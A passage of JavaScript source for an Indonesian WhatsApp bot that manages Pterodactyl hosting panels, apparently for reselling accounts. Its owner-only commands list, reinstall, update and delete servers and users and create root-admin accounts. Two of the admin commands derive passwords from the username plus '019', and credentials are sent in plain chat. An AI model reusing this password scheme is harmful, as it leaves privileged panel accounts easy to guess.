if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const text12 = `*Hi @${sender.split("@")[0]} 👋*

DE4YOU 
BY DE4YOU OFFCIAL

CARA ADD USER PANEL :
ram user,nomer

contoh server 1 : 1gb udin,6283183432282
contoh server 2 : 1gbb udin,6283183432282

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case 'reinstall1': {
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv + "/reinstall", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*REINSTALLING THE SERVER..*')
}
break
case 'reinstall2': {
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domainn + "/api/application/servers/" + srv + "/reinstall", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*REINSTALLING THE SERVER..*')
}
break
case 'updatesrv1': {
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
let t = text.split(',');
if (t.length < 4) return reply(`*Format salah*

Penggunaan:
${prefix + command} srvId,locId,memory/disk,cpu`)
let srv = t[0];
let loc = t[1];
let memo_disk = t[2].split`/`;
let cpu = t[3];
let f1 = await fetch(domain + "/api/application/servers/" + srv, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json()

let f = await fetch(domain + "/api/application/servers/" + srv + "/build", {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"allocation": parseInt(loc) || data.attributes.allocation,
"memory": memo_disk[0] || data.attributes.limits.memory,
"swap": data.attributes.limits.swap || 0,
"disk": memo_disk[1] || data.attributes.limits.disk,
"io": 500,
"cpu": cpu || data.attributes.limits.cpu,
"threads": null,
"feature_limits": {
"databases": 5,
"allocations": 5,
"backups": 5
}
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY UPDATED THE SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${week} ${date}
UPDATED AT: ${server.updated_at}`)
}
break
case 'updatesrv2': {
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
let t = text.split(',');
if (t.length < 4) return reply(`*Format salah*

Penggunaan:
${prefix + command} srvId,locId,memory/disk,cpu`)
let srv = t[0];
let loc = t[1];
let memo_disk = t[2].split`/`;
let cpu = t[3];
let f1 = await fetch(domainn + "/api/application/servers/" + srv, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
let data = await f1.json()

let f = await fetch(domainn + "/api/application/servers/" + srv + "/build", {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"allocation": parseInt(loc) || data.attributes.allocation,
"memory": memo_disk[0] || data.attributes.limits.memory,
"swap": data.attributes.limits.swap || 0,
"disk": memo_disk[1] || data.attributes.limits.disk,
"io": 500,
"cpu": cpu || data.attributes.limits.cpu,
"threads": null,
"feature_limits": {
"databases": 5,
"allocations": 5,
"backups": 5
}
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY UPDATED THE SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${week} ${date}
UPDATED AT: ${server.updated_at}`)
}
break
                case "listsrv1": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await Biiofc.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv1 ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;    
                case "listsrv2": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domainn + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyy
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikeyy
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await Biiofc.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv2 ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
                case "listsrv3": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domainnn + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyyy
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikeyyy
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await Biiofc.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv3 ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
              case "listusr1": {
  if (!isOwner) return reply(mess.only.premium)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await Biiofc.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr1 ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
              case "listusr2": {
  if (!isOwner) return reply(mess.only.premium)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domainn + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyy
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await Biiofc.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr2 ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
              case "listusr3": {
  if (!isOwner) return reply(mess.only.premium)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domainnn + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyyy
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await Biiofc.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr3 ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
        case "delsrv1": {
      if (!isOwner) return reply(`KHUSUS OWN `)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
        break
        case "delsrv2": {
      if (!isOwner) return reply(`KHUSUS OWN `)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domainn + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
        break
        case "delsrv3": {
      if (!isOwner) return reply(`KHUSUS OWN `)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domainnn + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyyy,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
        break
        case "delusr1": {
  if (!isOwner) return reply(`KHUSUS OWNER`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
        case "delusr2": {
  if (!isOwner) return reply(`KHUSUS OWNER`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domainn + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
        case "delusr3": {
  if (!isOwner) return reply(`KHUSUS OWNER`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domainnn + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyyy
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
                case "addusr1": {

if (!isOwner) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let t = text.split(',');
if (t.length < 3) return reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = await Biiofc.sendMessage(m.chat, { text: `
*SUCCESSFULLY ADD USER*

╭─❏ *『 USER INFO 』*
┣❐ ➤ *ID* : ${user.id}
┣❏ ➤ *USERNAME* : ${user.username}
┣❏ ➤ *EMAIL* : ${user.email}
┣❏ ➤ *NAME* : ${user.first_name} ${user.last_name}
┣❏ ➤ *CREATED AT* :  ${tanggal}
┗⬣ *PASSWORD BERHASIL DI KIRIM KE @${u.split`@`[0]}*`, mentions:[u],
})
Biiofc.sendMessage(u, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
╭─❏ *『 USER INFO 』*
┣❏ ➤ *📧EMAIL* : ${email}
┣❏ ➤ *👤USERNAME* : ${username}
┣❏ ➤ *🔐PASSWORD* : ${password.toString()}
┣❏ ➤ *🌐LOGIN* : ${domain}
┗⬣`,
})
}
break
                case "addusr2": {

if (!isOwner) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let t = text.split(',');
if (t.length < 3) return reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domainn + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = await Biiofc.sendMessage(m.chat, { text: `
*SUCCESSFULLY ADD USER*

╭─❏ *『 USER INFO 』*
┣❐ ➤ *ID* : ${user.id}
┣❏ ➤ *USERNAME* : ${user.username}
┣❏ ➤ *EMAIL* : ${user.email}
┣❏ ➤ *NAME* : ${user.first_name} ${user.last_name}
┣❏ ➤ *CREATED AT* :  ${tanggal}
┗⬣ *PASSWORD BERHASIL DI KIRIM KE @${u.split`@`[0]}*`, mentions:[u],
})
Biiofc.sendMessage(u, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
╭─❏ *『 USER INFO 』*
┣❏ ➤ *📧EMAIL* : ${email}
┣❏ ➤ *👤USERNAME* : ${username}
┣❏ ➤ *🔐PASSWORD* : ${password.toString()}
┣❏ ➤ *🌐LOGIN* : ${domainn}
┗⬣`,
})
}
break
case "crateadmin1": {
if (!isOwner) return reply(`*Lu Siape? Fitur Ini Khusus Owner Gw!*`)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = generateRandomPassword();
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@Oktz.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: ${domain}
`
    const listMessage = {

        text: tks,

    }

	

    await Biiofc.sendMessage(m.chat, listMessage)

    await Biiofc.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n
╔┈┈┈「INFO ADMIN」┈┈┈
╎👤USERNAME :  ${username}
╎🔐PASSWORD: ${password}
╎🌐LOGIN: ${domain}
╚┈┈┈┈┈┈┈┈┈┈┈┈┈┈
*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP PT/ADMIN PANEL HARAP JOIN !*
https://chat.whatsapp.com/HYMgswjwGwHFm9c8FXmSTs

*NOTE : *
➣*OWNER HANYA MENGIRIM 1X DATA AKUN*
➣*GARANSI 7HARI (KECUALI PT)*
➣*JNGAN JUAL ADMIN LAGI (KECUALI PT)*
➣*JNGAN JUAL HARGA MURAH*
➣*NO DRAMA COLONG SC*
➣*JNGAN OTAK ATIK SERVER*

`,

    })

} 
        break
                case "crateadmin2": {
if (!isOwner) return reply(`*Lu Siape? Fitur Ini Khusus Owner Gw!*`)
if (!isOwner) return reply(mess.owner)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "019"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domainn + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": username + "@Oktz.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: ${domainn}
`
    const listMessage = {

        text: tks,

    }

	

    await Biiofc.sendMessage(m.chat, listMessage)

    await Biiofc.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n

╔┈┈┈「INFO ADMIN」┈┈┈
╎👤USERNAME :  ${username}
╎🔐PASSWORD: ${password}
╎🌐LOGIN: ${domain}
╚┈┈┈┈┈┈┈┈┈┈┈┈┈┈
*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP PT/ADMIN PANEL HARAP JOIN !*
https://chat.whatsapp.com/HYMgswjwGwHFm9c8FXmSTs

*NOTE : *
➣*OWNER HANYA MENGIRIM 1X DATA AKUN*
➣*GARANSI 7HARI (KECUALI PT)*
➣*JNGAN JUAL ADMIN LAGI (KECUALI PT)*
➣*JNGAN JUAL HARGA MURAH*
➣*NO DRAMA COLONG SC*
➣*JNGAN OTAK ATIK SERVER*

`,

    })

} 
        break
                case "crateadmin3": {
if (!isOwner) return reply(`*Lu Siape? Fitur Ini Khusus Owner Gw!*`)
if (!isOwner) return reply(mess.owner)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "019"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domainnn + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyyy
},
"body": JSON.stringify({
"email": username + "@Oktz.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: ${domainnn}
`
    const listMessage = {

        text: tks,

    }

	

    await Biiofc.sendMessage(m.chat, listMessage)

    await Biiofc.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n

╔┈┈┈「INFO ADMIN」┈┈┈
╎👤USERNAME :  ${username}
╎🔐PASSWORD: ${password}
╎🌐LOGIN: ${domain}
╚┈┈┈┈┈┈┈┈┈┈┈┈┈┈
*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP PT/ADMIN PANEL HARAP JOIN !*
https://chat.whatsapp.com/HYMgswjwGwHFm9c8FXmSTs

*NOTE : *
➣*OWNER HANYA MENGIRIM 1X DATA AKUN*
➣*GARANSI 7HARI (KECUALI PT)*
➣*JNGAN JUAL ADMIN LAGI (KECUALI PT)*
➣*JNGAN JUAL HARGA MURAH*
➣*NO DRAMA COLONG SC*
➣*JNGAN OTAK ATIK SERVER*

`,

    })

} 
        break
        case "listadmin1": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await Biiofc.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listadmin1 ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
        case "listadmin2": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domainn + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyy
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await Biiofc.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listadmin2 ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
        case "listadmin3": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domainnn + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyyy
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await Biiofc.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listadmin3 ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
             case "addsrv1": {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
let s = text.split(',');
if (s.length < 7) return reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
